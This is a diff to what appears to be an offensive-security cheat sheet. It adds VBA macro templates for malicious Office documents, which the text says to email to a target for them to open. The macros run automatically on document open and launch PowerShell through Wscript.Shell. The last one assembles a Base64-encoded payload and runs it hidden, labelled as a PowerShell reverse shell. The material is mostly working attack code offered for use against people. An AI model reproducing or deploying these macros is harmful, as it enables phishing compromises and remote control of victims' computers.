@@ -61,3 +61,56 @@
         exploit
 
 ### Then, send the malicious document via email (for example) to your target and wait for them to open it. Then profit
+
+### Manual Macros
+
+#### 1) Auto-Executing Powershell on Document Open
+
+        Sub AutoOpen()
+            MyMacro
+        End Sub
+        
+        Sub Document_Open()
+            MyMacro
+        End Sub
+        
+        Sub MyMacro()
+            CreateObject("Wscript.Shell").Run "powershell"
+        End Sub
+
+#### 2) Passing Command as a String Variable
+
+        Sub AutoOpen()
+            MyMacro
+        End Sub
+        
+        Sub Document_Open()
+            MyMacro
+        End Sub
+        
+        Sub MyMacro()
+            Dim cmdStr As String
+            cmdStr = "[Your PowerShell Command]"
+            CreateObject("Wscript.Shell").Run cmdStr
+        End Sub
+
+#### 3) Macro for PowerShell Reverse Shell using Encoded Command
+
+        Sub AutoOpen()
+            MyMacro
+        End Sub
+        
+        Sub Document_Open()
+            MyMacro
+        End Sub
+        
+        Sub MyMacro()
+            Dim encodedCmd As String
+        
+            encodedCmd = encodedCmd + "[Base64 Chunk 1]"
+            encodedCmd = encodedCmd + "[Base64 Chunk 2]"
+            encodedCmd = encodedCmd + "..."
+            encodedCmd = encodedCmd + "[Base64 Chunk N]"
+        
+            CreateObject("Wscript.Shell").Run "powershell.exe -nop -w hidden -enc " & encodedCmd
+        End Sub
